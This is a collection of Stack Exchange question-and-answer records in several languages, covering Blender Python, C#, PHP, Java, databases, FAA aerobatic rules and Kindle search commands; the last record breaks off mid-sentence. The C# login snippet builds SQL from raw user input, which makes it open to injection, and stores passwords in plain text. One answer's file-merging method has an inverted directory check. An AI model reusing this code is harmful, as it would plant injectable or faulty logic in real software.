{"title": "Select neighbour faces from a mesh with python", "description": "I am new to blender and python and try to get the hang of it. PS: Everything should be achieved via python script.\nI want to create a low poly model via ico-sphere. That's really easy because I just need to create a ico-sphere. Now I want to randomly select a face and one of his neighbours to merge them via bpy.ops.mesh.edge_face_add() to a new face.\nI am having the following script:\nbpy.ops.object.mode_set(mode = 'EDIT') # into edit mode\nbpy.ops.mesh.select_all(action='DESELECT') # deselect everything\nbpy.context.tool_settings.mesh_select_mode = (True , False , False) # only faces\nmesh=bmesh.from_edit_mesh(me) # get mesh\nmesh.faces.ensure_lookup_table() # update faces\nmesh.faces[0].select = True # select face number 0\nmesh.faces[1].select = True # select face number 1\nbpy.ops.mesh.edge_face_add() # merge them\nbpy.ops.mesh.select_all(action='DESELECT') # deselect everything\n\nAt first I am using bmesh which is experimental. I would like to use a blender api which isn't experimental. Any ideas?\nI tried it with faces[0] and 1 and it worked, they are neighbours. But I think that's not always. How can I find out which faces are next to faces[0] for example.\nThanks for helping!\n", "answer": "does his help? Start with the template in:\n\nTextEditor > Templates > Python > Bmesh Simple Editmode\n\nimport bpy\nimport bmesh\n\nobj = bpy.context.edit_object\nme = obj.data\n\nbm = bmesh.from_edit_mesh(me)\n\nface = bm.faces[3]\nface.select = True\nprint(dir(face.verts[0].link_faces))\nprint(face.verts[0].link_faces[:])\n\n# This gives the list of all edges that use that vertex.\n# [<BMFace(0x7f7acb5ddb70), index=52, totverts=4>,    \n#  <BMFace(0x7f7acb5ddbe0), index=54, totverts=4>,\n#  <BMFace(0x7f7acb5ddba8), index=53, totverts=4>,  \n#  <BMFace(0x7f7acb5dd0b8), index=3, totverts=4>]\n\nbmesh.update_edit_mesh(me, True)\n\nThere's also link_edges which could also prove useful, arguably more so\nimport bpy\nimport bmesh\n\nobj = bpy.context.edit_object\nme = obj.data\n\nbm = bmesh.from_edit_mesh(me)\n\n# just assume now there is only one selected face\nselected_face = [f for f in bm.faces if f.select][0]\n\nfor edge in selected_face.edges:\n    linked = edge.link_faces\n    for face in linked:\n        face.select = True\n\nbmesh.update_edit_mesh(me, True)\n\nproduces\n\nAnd finally, the join command\nimport bpy\nimport bmesh\n\nobj = bpy.context.edit_object\nme = obj.data\n\nbm = bmesh.from_edit_mesh(me)\n\n# just assume now there are at least 2 selected, and are touching\nselected_faces = [f for f in bm.faces if f.select]\n\n# the script equivalent of the F key        \nbmesh.ops.contextual_create(bm, geom=selected_faces)\n\nbmesh.update_edit_mesh(me, True)\n\nRegarding your statement about Bmesh being experimental, I wouldn't worry about that too much, it's being used a lot and has proven to be more than capable. The Bmesh.ops docs are an excellent but admittedly terse resource:\n", "question_score": "9", "answer_score": 14}
{"title": "How to Link/Append a data-block using the Python API?", "description": "I'm searching a way to append a group in Python.\nIt should behave exactly like the Append function (ShiftF1) works, all objects should be local and editable. The idea is to append a character (with rig etc.) via Python and not Link it (to be able to modify it without making everything local one by one).\nThanks\n", "answer": "Here's a solution. It appends an instance of the group (Blender 2.7x only):\nimport bpy\n\nfilepath = \"/path/to/file.blend\"\ngroup_name = \"CubeGroup\"\n\n# append, set to true to keep the link to the original file\nlink = False \n\n# append all groups from the .blend file\nwith bpy.data.libraries.load(filepath, link=link) as (data_src, data_dst):\n    ## all groups\n    # data_to.groups = data_from.groups\n\n    # only append a single group we already know the name of\n    data_dst.groups = [group_name]\n\n# add the group instance to the scene\nfor group in data_dst.groups:\n    ob = bpy.data.objects.new(group.name, None)\n    ob.dupli_group = group\n    ob.dupli_type = 'GROUP'\n    bpy.context.scene.objects.link(ob) # Blender 2.7x\n\nCredit: solution is based on this answer: Import object without bpy.ops.wm.link_append\n\nIt's basically the same for objects:\nimport bpy\n\n# path to the blend\nfilepath = \"/path/to/file.blend\"\n\n# name of object(s) to append or link\nobj_name = \"Cube\"\n\n# append, set to true to keep the link to the original file\nlink = False\n\n# link all objects starting with 'Cube'\nwith bpy.data.libraries.load(filepath, link=link) as (data_from, data_to):\n    data_to.objects = [name for name in data_from.objects if name.startswith(obj_name)]\n\n#link object to current scene\nfor obj in data_to.objects:\n    if obj is not None:\n       #bpy.context.scene.objects.link(obj) # Blender 2.7x\n       bpy.context.collection.objects.link(obj) # Blender 2.8x\n\nAs of Blender 2.8 groups have been replaced by the new collection system:\nimport bpy\n\n# path to the blend\nfilepath = \"/path/to/file.blend\"\n\n# name of collection(s) to append or link\ncoll_name = \"MyCollection\"\n\n# append, set to true to keep the link to the original file\nlink = False\n\n# link all collections starting with 'MyCollection'\nwith bpy.data.libraries.load(filepath, link=link) as (data_from, data_to):\n    data_to.collections = [c for c in data_from.collections if c.startswith(coll_name)]\n\n# link collection to scene collection\nfor coll in data_to.collections:\n    if coll is not None:\n       bpy.context.scene.collection.children.link(coll)\n\nFurther information: https://www.blender.org/api/current/bpy.types.BlendDataLibraries.html\n", "question_score": "9", "answer_score": 20}
{"title": "È scorretto scrivere \"Scrivete un email\" senza apostrofo?", "description": "È scorretto scrivere \"Scrivete un email\" senza apostrofo?\nA me email suona come un nome femminile e quindi io l'apostrofo lo metterei. Tuttavia il dizionario riporta: e-mail s. ingl. inv.; in it. s.f. inv. (anche m.)\n", "answer": "e-mail: (secondo Treccani  è   un sostantivo femminile), quindi \"un e-mail\" non è corretto. \n\ne-mail ‹i mèil› locuz. ingl. [comp. di e-2 e mail «posta»], usata in ital. come s. f. – Nel linguaggio delle telecomunicazioni e dell’informatica, lo stesso che posta elettronica (v. posta1, n. 3 f); estens., il messaggio trasmesso con tale mezzo: scrivere, inviare, ricevere una e-mail (o per ellissi, una mail); mi dai la tua e-mail?; comunicare, mandare un documento per e-mail; anche in funzione attributiva (posposto al sost.): avere più di un indirizzo e-mail.\n\n\"un'e-mail\" o \"una e-mail\"?\n\nL’elisione è un fenomeno che comporta la perdita della vocale terminale non accentata di una parola davanti alla vocale iniziale della parola successiva. Nell’italiano scritto contemporaneo il fenomeno, perfettamente regolare, sembra in netta regressione. Entrambe le forme, un’e-mail e una e-mail sono comunque corrette.\nAl plurale, l’elisione è meno usata se non rara; è di sapore antiquatamente letterario se la vocale iniziale della parola seguente è diversa dalla marca del plurale con cui termina l’articolo o l’aggettivo (l’edere è ricercato e raro; quell’anime è decisamente affettato, a meno che non si stia mettendo su pagina una parodia dell’italiano letterario antico).\n\nTreccani.it\n", "question_score": "8", "answer_score": 11}
{"title": "Fechar conexão com banco de dados c#", "description": "Estou fazendo um sistema de login e recebo a mensagem de sql exception quando tento criar nova conta no banco de dados:\nMySqlCommand usuaExiste = new MySqlCommand(\n    \"SELECT * FROM contas WHERE nome = '\"+textBox1.Text+\"'\", bdConn);\nbool resultado = usuaExiste.ExecuteReader().HasRows;\nif (resultado == true || textBox2.Text == null || textBox2.Text.Length < 4)\n{\n    MessageBox.Show(\"Por favor, certifique se sua senha não é muito curta, seu usuário já é existente ou ele é muito curto.\");\n}\nelse\n{\n    try\n    {\n        MySqlCommand criar = new MySqlCommand(\"INSERT INTO contas (nome, senha) VALUES ('\" + textBox1.Text + \"','\" + textBox2.Text + \"')\", bdConn);\n        criar.BeginExecuteNonQuery();\n        criar.ExecuteNonQuery();\n        MessageBox.Show(\"Conta Criada com sucesso!\");\n        bdConn.Close();\n    }\n    catch (MySqlException ex)\n    {\n        MessageBox.Show(\"Erro ao criar a conta, informe isto ao desenvolvedor! \\r\\n \"+ ex);\n    }\n}\n\nOcorre o seguinte erro:\n\n", "answer": "Nesta linha:\nbool resultado = usuaExiste.ExecuteReader().HasRows;\n\nVocê está criando um Data Reader. Um Data Reader é um objeto que você usa para fazer leituras rápidas do resultado de uma consulta. Enquanto você tiver um Data Reader aberto numa conexão, você não deve executar comandos nela. Você deve fechar o Data Reader antes de executar os comandos, exatamente como a mensagem de erro indica.\nNote que o Data Reader é o retorno do método ExecuteReader. Você não está segurando esse Data Reader em uma variável, e dessa forma não terá como fechá-lo. Sugiro fazer algo mais parecido com:\nbool resultado;\nusing (var dataReader = usuaExiste.ExecuteReader()) {\n    resultado = dataReader.HasRows();\n} // o \"using\" garantirá o fechamento do Data Reader aqui\n\nNote que há outras formas de se saber se uma determinada consulta tem resultados, que podem eliminar a necessidade do uso de um Data Reader. Aparentemente você só utiliza o Data Reader para saber se determinada consulta traz resultados. O método ExecuteScalar do objeto de comando retorna o valor da célula na primeira coluna e primeira coluna do resultado. Se você fizer um SELECT COUNT ou algo do tipo, você pode usar o método ExecuteScalar e dispensar o Data Reader.\n", "question_score": "9", "answer_score": 12}
{"title": "Hospedando site no Windows Azure de graca?", "description": "O Windows Azure permite um tempo de trial de 30 dias para testar a plataforma, mas e depois disso? Existe uma opcao gratis de hospedagem de aplicacoes .net, mas nao esta claro se voce tera algum custo ou apos o periodo de trial se sera possivel continuar a utilizar os planos mais basicos gratuitamente.\n", "answer": "Comforme Perguntas frequentes sobre compra do Windows Azure:\n\nSim. Com nosso novo recurso Limite de Gastos, os clientes que assinarem a oferta Avaliação Gratuita por 90 Dias, MSDN ou Cloud Essentials poderão utilizar o Windows Azure sem nenhum receio de serem cobrados, desde que mantenham o recurso Limite de Gastos ativado.\n\nE em Limite de Gastos do Windows Azure, há duas partes que chamam atenção:\n\nAgora, por padrão, todos os novos clientes que se inscreverem para a oferta de avaliação ou uma de nossas ofertas para membros (por exemplo, a oferta do MSDN) terão um Limite de Gastos de $0. Boa notícia\nQuando seu uso ultrapassar as quantias mensais incluídas na sua oferta, seu serviço será desabilitado no restante daquele mês de cobrança (...). Existe um limite, se passar dele, seu serviço será desativado.\nSe a assinatura tiver sido desabilitada porque o Limite de Gastos foi atingido, clique na notificação: \"A assinatura alcançou o Limite de Gastos e foi desabilitada para evitar encargos\". Caso contrário, clique em \"Remover limite de gastos\" na área Tarefas. Ou seja, para ter sua aplicação ativa, você teria que reativar pagamento, e uma vez ativado pagamento, você nunca mais poderá desativar essa feature.\n\nA única coisa que não está clara é se o limite básico sempre estará disponível de graça e você só paga a diferença, como ocorre com o free tier da Amazon EC2 pelo período de um ano.\nEntão, sim, é possível usar de graça. Porém sua aplicação não poderá exceder os limites impostos por eles.\n", "question_score": "9", "answer_score": 11}
{"title": "Como unir vários arquivos texto em um só?", "description": "Alguém sabe como fazer pra selecionar todos os arquivos texto de um mesmo diretório e juntar as informações de todos eles em apenas um arquivo texto final?\nExemplo: Na pasta X, tenho os arquivos 1.txt, 2.txt e 3.txt. Preciso juntar o conteúdo de todos em apenas um arquivo texto.\nTentei esse código, que compila mas quando executa é levantada uma excepção do tipo IndexOutofRange.\nstring[] stringArray = Directory.GetFiles(@\"C:\\InventX\", \"*.txt\");\n        System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();\n        for (int i = 0; i <= stringArray.Count(); i++)\n        {\n            stringBuilder.Append(System.IO.File.ReadAllText(stringArray[i]));\n        }\n        string bulidOutput = stringBuilder.ToString();\n        string newFilePath = @\"C:\\Lala.txt\";\n        System.IO.File.WriteAllText(newFilePath, bulidOutput);\n\n", "answer": "O erro no seu código deve-se a esta condição:\nfor (int i = 0; i <= stringArray.Count(); i++)\n\ndeveria ser\nfor (int i = 0; i < stringArray.Count(); i++)\n\nComo está, na ultima iteração, quando i == stringArray.Count() e dado que os arrays são índice zero irá levantar a excepção IndexOutOfRangeException.\nPara acrescentar, uma forma eficiente de unir os ficheiros é lê-los bocado a bocado e ir escrevendo à medida que cada bocado é lido. Pode alterar o tamanho do buffer e ir comparando os ganhos/perdas relativamente à performance para perceber qual se adequa melhor ao seu cenário.\npublic void UnirFicheiros(string directorio, string filtro, string ficheiroUnido)\n{\n    if (Directory.Exists(directorio))\n        throw new DirectoryNotFoundException();\n\n    const int bufferSize = 1 * 1024;\n    using (var outputFile = File.Create(Path.Combine(directorio, ficheiroUnido)))\n    {\n        foreach (string file in Directory.GetFiles(directorio, filtro))\n        {\n            using (var inputFile = File.OpenRead(file))\n            {\n                var buffer = new byte[bufferSize];\n                int bytesRead;\n                while ((bytesRead = inputFile.Read(buffer, 0, buffer.Length)) > 0)\n                {\n                    outputFile.Write(buffer, 0, bytesRead);\n                }\n            }\n        }\n    }\n}\n\n", "question_score": "9", "answer_score": 10}
{"title": "No Entity Framework, os métodos SingleOrDefault() e FirstOrDefault() apresentam comportamentos diferentes?", "description": "Qual são as diferenças entre SingleOrDefault() and FirstOrDefault(), e quando usar?\n", "answer": "SingleOrDefault retorna o único elemento de uma sequência, ou um valor padrão se a sequência está vazia; este método gera uma exceção se houver mais de um elemento na sequência. (MSDN, Método Enumerable.SingleOrDefault (IEnumerable), 2014. Disponível em: http://msdn.microsoft.com/pt-br/library/bb342451%28v=vs.110%29.aspx. Data de acesso. 08.jun.2014). Ou seja, se na consulta tiver apenas um registro pode ser utilizado sem problemas, mas mais que um registro ele retorna uma exceção igual a imagem logo abaixo:\n\nPode ser utilizado para campos chave primárias (Primary Key) sem problemas, e se não tiver nenhum registro, o método retornar o valor padrão do tipo informado.\nFirstOrDefault retorna o primeiro elemento de uma sequência, ou um valor padrão se a sequência não contiver elementos(MSDN, Método Enumerable.FirstOrDefault (IEnumerable), 2014. Disponível em: http://msdn.microsoft.com/pt-br/library/bb340482%28v=vs.110%29.aspx. Data de acesso: 08.jun.2014). Não tem o mesmo problema do  SingleOrDefault, ele busca o primeiro elemento em vários encontrados, não emitindo erros. \nExistem também a diferença entre esses dois métodos na sua geração de SQL: O SingleOrDefault faz um Select Top(2), enquanto, o FirstOrDefault faz um Select Top(1).\nConclusão:\nSe pretende trazer apenas um registro ou testar a ocorrência de mais itens com uma exceção utilize SingleOrDefault, se não utilize FirstOrDefault, para que traga a primeira ocorrência ou então o valor padrão (default).\nReferências:\n\nMétodo Enumerable.SingleOrDefault (IEnumerable)\nMétodo Enumerable.FirstOrDefault (IEnumerable)\n\n", "question_score": "9", "answer_score": 10}
{"title": "Qual a diferença entre MVC \"action based\" e \"component based\"?", "description": "Esta resposta desta pergunta respode as vantagens e desvantagens de cada um, mas sem explicar qual a diferença entre eles.\nPergunto:\n\nQual a diferença entre eles?\nExemplos de frameworks que usam cada um deles.\n\nObs.: Deixemos de fora as vantagens/desvantagens, pois isso pode ser respondido na pergunta linkada acima\n", "answer": "Frameworks Component Based\nFrameworks Component Based mantém sincronia entre os estados dos componentes da view e do seu modelo de dados no lado do servidor.\nQuando o usuário interage com a tela, as alterações realizadas são, em um dado momento, refletidas no modelo que fica no servidor.\nNo JSF, por exemplo, a \"tela\" é gerada por um facelet, que nada mais é que um XML que define quais componentes serão exibidos para o usuário e associam os valores desses componentes a um objeto (Java Bean) que fica no servidor. Esses componentes são então renderizados em HTML e, quando o usuário executa uma ação, o JSF atualiza os objetos no servidor.\nNão encontrei uma representação visual adequada, mas algo aproximado num artigo da Caelum sobre o tema:\n\nEm frameworks component based, a view é responsável por mapear valores para os beans e para o modelo. A imagem acima ilustra a ordem de chamadas:\n\nO usuário executa uma ação no sistema\nO front controller do framework atualiza os componentes da view com o estado atual\nO método do Managed Bean é chamado (usando JSF como exemplo), podendo executar alguma regra de negócio com os novos valores\nFinalmente, o modelo do sistema é atualizado\n\nFrameworks Action Based\nJá os frameworks Action Based não mantém necessariamente esse vínculo entre os estados do servidor e do cliente. \nIsso não quer dizer que o desenvolvedor não possa armazenar estado no servidor, por exemplo, na sessão do usuário, mas que o vínculo entre o modelo e a view não é tão acoplado como no modelo Component Based.\nUm framework Action Based geralmente irá receber diretamente requisições HTTP. Isso torna o modelo action based mais flexível, já que o desenvolvedor pode optar por qualquer tipo de view que gere uma requisição HTTP compatível.\nConsidere a ilustração a seguir (da mesma fonte anterior):\n\nO resumo dos passos da execução é:\n\nO usuário executa uma ação no sistema\nO front controller do framework direciona a requisição e os parâmetros para um método do controller\nO controller lê os parâmetros necessários e executa regras de negócio que atualizam o modelo\nO controller \"devolve\" uma view para o usuário\n\nConclusão\nPodemos dizer que os frameworks component based são mais centrados nas views (com seus componentes que mapeiam o modelo e os dados do usuário), enquanto os action based são mais centrados nos controllers (que recebem parâmetros via request).\nExemplos de frameworks já estão na resposta citada na questão.\n", "question_score": "9", "answer_score": 10}
{"title": "Setar OPTION como SELECTED com base em valores do banco de dados", "description": "Estou a preparar um formulário onde estou a setar os valores do campos com os dados do banco de dados.\nEstou com dificuldade em setar a opção escolhida como selected para o <select/> no código em baixo:\nPHP\n<!-- ATENCAO -->\n<label>Tipo Beneficiario: </label> <span> <? echo $TipoBeneficiario; ?> </span>\n<div class=\"\">\n  <select name=\"tipoBeneficiario\">\n    <option value=\"0\">Selecione</option>\n    <option value=\"1\">Conjugue</option>\n    <option value=\"2\">Filho</option>\n    <option value=\"3\">Mãe/Pai</option>\n    <option value=\"4\">Compannheira(o)</option>\n  </select>\n</div>\n\nCaptura de Tela do formulário\n\n", "answer": "Uma opção também, seria testar o valor para cada option e imprimir selected quando corresponder, exemplo:\n<label>Tipo Beneficiario: </label> <span> <?php echo $TipoBeneficiario; ?></span>\n<div class=\"\">\n  <select name=\"tipoBeneficiario\">\n    <option value=\"0\" <?=($TipoBeneficiario == 'Selecione')?'selected':''?> >Selecione</option>\n    <option value=\"1\" <?=($TipoBeneficiario == 'Conjugue')?'selected':''?> >Conjugue</option>\n    <option value=\"2\" <?=($TipoBeneficiario == 'Filho')?'selected':''?> >Filho</option>\n    <option value=\"3\" <?=($TipoBeneficiario == 'Mãe/Pai')? 'selected':''?> >Mãe/Pai</option>\n    <option value=\"4\" <?=($TipoBeneficiario == 'Companheira(o)')?'selected':''?> >Compannheira(o)</option>\n  </select>\n</div>\n\nNo exemplo, a condição é testada utilizando if ternário, onde\n <?=($TipoBeneficiario == 'Companheira(o)')? 'selected' : ''?>\n\né o mesmo que\n<?php \nif($TipoBeneficiario == 'Companheira(o)'){\n   echo 'selected';\n}\n?>\n\nSe você não tem a opção de short tags habilitada no servidor ou prefere não utilizar, você pode fazer:\n<label>Tipo Beneficiario: </label> <span> <?php echo $TipoBeneficiario; ?></span>\n<div class=\"\">\n  <select name=\"tipoBeneficiario\">\n    <option value=\"0\" <?php echo $TipoBeneficiario=='Selecione'?'selected':'';?> >Selecione</option>\n    <option value=\"1\" <?php echo $TipoBeneficiario=='Conjugue'?'selected':'';?> >Conjugue</option>\n    <option value=\"2\" <?php echo $TipoBeneficiario=='Filho'?'selected':'';?> >Filho</option>\n    <option value=\"3\" <?php echo $TipoBeneficiario=='Mãe/Pai'?'selected':'';?> >Mãe/Pai</option>\n    <option value=\"4\" <?php echo $TipoBeneficiario=='Companheira(o)'?'selected':'';?> >Companheira(o)</option>\n  </select>\n</div>  \n\n", "question_score": "9", "answer_score": 16}
{"title": "Arvore Genérica, como fazer?", "description": "Estou tentando montar uma Arvore Genérica em java para montar uma expressão booleana dentro de um algoritmo de expressão genética, essa árvore guardaria vários tipos de variáveis, não sei o certo qual a forma mais otimizada para se fazer isso, estava pensando em guardar operador lógicos como &&, || em strings e também os operadores matemáticos +, -, /, *. Os operadores seriam guardados nos nós dos galhos/raiz e os operandos que poderiam ser funções ou variáveis seriam guardados nos nós terminais(folhas), alguém tem alguma ideia? Passei o dia nesse problema e estou um pouco frustado.\npublic class ArvoreJava {    \n   public static No raiz; // o único campo de dado em Arvore    \n\n   public ArvoreJava() { // construtor    \n     raiz = null;  //nenhum nó na arvore    \n   }   \npublic static No insere(String palavra, No no) {  //metodo insere  \n\n        if(no == null){  \n            no = new No(palavra);  //se nao existir nó cria um novo  \n        }  \n\n        else if((compare(palavra, no.palavra)) < 0){ // faz comparação, se palavra  \n            no.filhoEsquerda = ArvoreJava.insere( palavra , no.filhoEsquerda);// menor que nó, insere na esquerda  \n        }  \n        else if((compare(palavra, no.palavra)) > 0){//se palavra maior que nó, insere na direita  \n           no.filhoDireita = ArvoreJava.insere(no.palavra, no.filhoDireita);  \n        }  \n        else{// senão, palavra já contem  \n            System.out.println(\"ERRO: valor já existe na árvore.\");  \n            return null;  \n        }  \n\n        return no;  \n\n}  \npublic static void caminhando(ArvoreJava arv){//caminha na arvore   \n                System.out.println(\"Pré-ordem: \");  \n        arv.preordem(arv.raiz);  \n\n}  \npublic static int compare(String palavra, String no){ // compara strings e retorna um inteiro  \n     return palavra.toString().compareTo(no.toString());//-1 menor, 1 maior, 0 iguais  \n}  \n\n        public  void preordem(No no)    {//caminha em preordem  \n            if (no == null){  \n        return;  \n        }  \n    System.out.println(no.palavra);  \n    preordem(no.filhoEsquerda);  \n    preordem(no.filhoDireita);  \n    }  \n\n}  \n\nE a classe do nó.\npackage arvore;  \n\npublic class No {  \n\n     String palavra;    //dado  \n     No filhoEsquerda; //cria filho  a esquerda  \n     No filhoDireita;  // cria filho a direita  \n\n    public No(String palavra){  \n        this.palavra = palavra;  \n    }  \n\n     public void mostraNo(){     \n       {     \n\n             System.out.print(palavra);     \n             System.out.print(\", \");     \n\n        }     \n     }     \n   }  \n\nOu seja, o que eu saberia implementar é bem simples, mas no projeto pessoal preciso implementar uma estrutura com essas características ou proximo das mesmas para chegar perto de alguma resultado satisfatório. Quem tiver a paciência para tentar ajudar, eu agradeço desde já. \n", "answer": "Em primeiro lugar, se você precisa guardar tipos diferentes em uma estrutura de dados, você deve definir um supertipo para todos eles. Por exemplo, em vez do seu nó ser uma classe, faça com que ele seja uma interface genérica:\ninterface No<T> {\n    T avaliar();\n}\n\nEntão você pode definir seus nós de modo que eles implementem essa interface, porém cada um dando uma implementação ligeiramente diferente:\nclass FolhaNumerica implements No<Double> {\n    double valor;\n    Double avaliar() { return valor; }\n}\n\nclass FolhaBooleana implements No<Boolean> {\n    boolean valor;\n    Boolean avaliar() { return valor; }\n}\n\nPara os operadores, minha sugestão é usar classes ou enumerações para representá-los (classes se você prevê que eles vão/podem mudar muito, enumerações se eles são mais ou menos fixos). Dessa forma você não só os representa, mas pode também fazer algo útil com eles:\ninterface Operador<E,S> {\n    S aplicar(E[] operandos);\n    Class<E> obterClasseOperandos(); // Workaround para uma limitação nos tipos genéricos\n}\n\nclass Soma implements Operador<Double,Double> {\n    String toString() { return \"+\"; }\n    Double aplicar(Double[] operandos) {\n        double ret = 0;\n        for ( Double d : operandos )\n            ret += d;\n        return ret;\n    }\n    Class<Double> obterClasseOperandos() { return Double.class; }\n}\n\nclass Conjuncao implements Operador<Boolean,Boolean> {\n    String toString() { return \"&&\"; }\n    Boolean aplicar(Boolean[] operandos) {\n        for ( Boolean b : operandos )\n            if ( !b )\n                return false;\n        return true;\n    }\n    Class<Boolean> obterClasseOperandos() { return Boolean.class; }\n}\n\nclass Igualdade implements Operador<Double,Boolean> {\n    String toString() { return \"==\"; }\n    Boolean aplicar(Double[] operandos) {\n        double primeiro = operandos[0];\n        for ( Double d : operandos )\n            if ( d != primeiro )\n                return false;\n        return true;\n    }\n    Class<Double> obterClasseOperandos() { return Double.class; }\n}\n\n(Nota: em vez de ter operadores unários e binários, fiz com que todos os operadores aceitassem um número variável de argumentos, para simplificar)\nPor fim, você pode criar uma classe também genérica para representar os galhos/raiz:\nclass Galho<E,S> implements No<S> {\n    Operador<E,S> op;\n    No<E>[] operandos;\n\n    S avaliar() {\n        @SuppressWarnings(\"unchecked\")\n        E[] array = (E[])Array.newInstance(op.obterClasseOperandos(), operandos.length);\n        for ( int i = 0 ; i < array.length ; i++ )\n            array[i] = operandos[i].avaliar(); // Avalia cada sub-nó recursivamente\n\n        return op.aplicar(array); // Passa os resultados para o operador\n    }\n}\n\nDessa forma, você pode montar a árvore que quiser:\n// (4 == 2 + 2) && true\nNo<Double> mais = new Galho<Double,Double>(new Soma(), new FolhaNumerica(2), new FolhaNumerica(2))\nNo<Boolean> igual = new Galho<Double,Boolean>(new Igualdade(), new FolhaNumerica(4), mais);\nNo<Boolean> raiz = new Galho<Boolean,Boolean>(new Conjuncao(), igual, new FolhaBooleana(true));\n\nboolean resultado = raiz.avaliar(); // true\n\nExemplo no ideone. Fonte do código para se criar um array genérico: essa resposta no SOen.\nEsse é só um exemplo. Se achar necessário, pode criar mais tipos de folhas (até mesmo um tipo genérico Folha<T> com T valor), mais tipos de operadores (acho que nem faz sentido subtração com mais de 2 operandos), mais tipos de galhos, etc.\nNota: na minha resposta, omiti os construtores, modificadores e alguns tipos genéricos para o código não ficar muito extenso. O exemplo no ideone preenche as lacunas.\n", "question_score": "9", "answer_score": 12}
{"title": "O que significa PSR?", "description": "Olá pessoal recentemente encontrei um termo chamado PSR na area de PHP, mas o topico não foi muito esclarecedor em definir o real significado da palavra PSR, vi que ele estava relacionado com a area de Orientaçao a Objetos, fiz uma pesquisa no google e não encontrei muita coisa, acredito que pesquisei pelos termos errados.\nMas enfim, alguem poderia me explicar o significado do PSR e sua real aplicação?\n", "answer": "As PSR (do inglês PHP Standards Recommendation) são especificações de projetos propostos pelo PHP-FIG (PHP Framework Interop Group), um grupo composto por representantes de expressivos projetos em PHP.\nEsses padrões tem como objetivo facilitar a reutilização de código entre os diversos projetos que implementem determinado padrão.\nUm exemplo é a PSR-3, que sugere uma especificação para Interface de Logs de Aplicação. Qualquer projeto que suporte a PSR-3 pode simplesmente substituir o módulo de logs por outro compatível que também suporte a PSR-3 sem nenhum impacto no projeto original (Ai temos a ideia da interoperabilidade entre os projetos).\nAlém do padrão de Logs, existem PSRs para implementações de autoload (PSR-0 e PSR-4), sugestões de estilos de código, como posição de chaves, indentação (Usar tabulações ou espaços?) (PSR-1 e PSR-2).\nExistem também propostas em draft para padronização dos docblock de documentação (PSR-5) e uma interface para requisições HTTP (PSR-7)\nMais informações leia o FAQ e visite o repositório no GitHub com os padrões já aceitos pelo grupo.\n\nÉ importante lembrar que a adoção desses padrões no seu projeto é opcional. \nNinguém é obrigado a implementar funcionalidade \"X\" de certa maneira, porém é recomendado implementar a partir de um padrão já conhecido e adotado pela comunidade para não causar dores de cabeça futuras com seu código.\n", "question_score": "9", "answer_score": 17}
{"title": "Principais diferenças entre MongoDB e Redis", "description": "Estou a ler um livro sobre aplicações real time com NodeJs.\nO autor utilizou MongoDB e Redis para exemplificar o uso de base de dados com NodeJs.\nA minha dúvida surgiu quando ele utilizou as duas ao mesmo tempo, justificando que Redis seria usado para dados que necessitam de constantes actualizações porque é mais rápido a gravar e ler dados em um disco rígido.\nA dúvida é, porque utilizar MongoDB? Qual a razão técnica para dividir o projecto entre MongoDB e Redis?\n", "answer": "Redis usa um paradigma diferente do MongoDB.\nRedis utiliza o paradigma chave-valor para o armazenamento de dados. Basicamente, é um \"array gigante\" que fica na memória do servidor, você pede para o Redis \"me dê os dados da chave XXX\" e ele só retorna os dados. Ele pode trabalhar com dados simples e com listas de dados. \nVantagens: o acesso aos dados é realizado de forma ágil, sem acesso ao disco, de forma assinstótica O(1) (traduzindo: muito rápido mesmo). \nDesvantagens: ele não permite operações especiais, como joins do SQL ou aninhamento de dados, sem falar que como os dados são todos armazenados na memória RAM, você precisa de espaço de memória disponível do mesmo tamanho da quantidade de dados que você vai armazenar, o que pode ser um problema.\n\nMongoDB utiliza o paradigma de documentos. Ele armazena os dados em formato JSON, de forma aninhada (documentos podem conter dados, arrays ou outros documentos) e não relacional.\nVantagens: acesso rápido aos dados e fácil visualização por se tratar de um JSON, que é muito mais human-readable que outros formatos de dados. \nDesvantagem: assim como o Redis, não existe relacionamento de dados. Se for necessário algum relacionamento, ele deve ser realizado a nível de aplicação, por exemplo: Usuário B foi criado por Usuário A, mas Usuário A foi apagado do sistema, então cabe a sua aplicação tratar esse tipo de referenciamento nulo, já que o MongoDB não faz relacionamentos.\n\nResumindo: Redis é um array que fica na memória e é mais utilizado para coisas simples que precisam ser cacheadas ou para acesso rápido. MongoDB é um banco de dados de documentos flexível que não utiliza relacionamentos entre eles e permite que documentos guardem dados, arrays e até mesmo outros documentos.\n", "question_score": "9", "answer_score": 12}
{"title": "What are the US definition and restrictions on aerobatic flight?", "description": "In the US, what is the legal definition of aerobatic flight? What are the restrictions (both for the aircraft and its location/maneuvers) applied to aerobatic flight? I remember reading something about a restriction on degrees of pitch or bank, but I was looking around for it and can't seem to find it again.\n", "answer": "Aerobatic flight is \"an intentional maneuver involving an abrupt change in an aircraft's attitude, an abnormal attitude, or abnormal acceleration, not necessary for normal flight.\"\nAccording to the FAA (91.303), no person may operate an aircraft in aerobatic flight:\n\nOver any congested area of a city, town, or settlement;\nOver an open air assembly of persons;\nWithin the lateral boundaries of the surface areas of Class B, Class C, Class D, or Class E airspace designated for an airport;\nWithin 4 nautical miles of the center line of any Federal airway;\nBelow an altitude of 1,500 feet above the surface; or\nWhen flight visibility is less than 3 statute miles.\n\nAerobatic flight is sometimes considered to be flight with more than 30 degrees pitch or more than 60 degrees bank. This is incorrect. It applies to wearing a parachute. (FAR 91.307)\nA normal category aircraft is certified for the following \"non-acrobatic\" operation: Stalls, lazy eights, chandelles, and steep turns, in which the angle of bank is not more than 60°.\nA utility category aircraft is certified for spins (if approved for plane), lazy eights, chandelles, and steep turns, or similar manoeuvres, in which the angle of bank is more than 60 degrees but not more than 90 degrees. \nAn acrobatic category aircraft is required for other aerobatics.\n", "question_score": "9", "answer_score": 12}
{"title": "What commands can be given in the Kindle's search box?", "description": "In this forum thread, a user explains that the Kindle's reading speed algorithm can be reset by typing \";ReadingTimeReset\" in the Kindle's search box. The user states he was told by a member of Amazon's support team.\nIt seems obvious that this is a hidden mechanism for passing commands to the Kindle's software. What other commands can be given this way?\n", "answer": "At least the following are supposed to work, although I haven't verified them:\n;debugOn // verbose logging\n;debugOff // non-verbose logging\n~help\n~usbNetwork  // starts a Dropbear SSH server\n;ReadingTimeOff - switches off the reading time display\n;ReadingTimeOn - switches on the reading time display\n;ReadingTimeReset - resets the reading time computation\n@author AuthorName keyword\n@store keyword\n@web keyword\n@wiki keyword\n@time\n\nAs @Tim pointed out in the comments, ~usbNetwork is non-standard, and some of the other \"searches\" on here may be hacks that require installation of additional software.\nThe following may be Touch-only; I can't verify 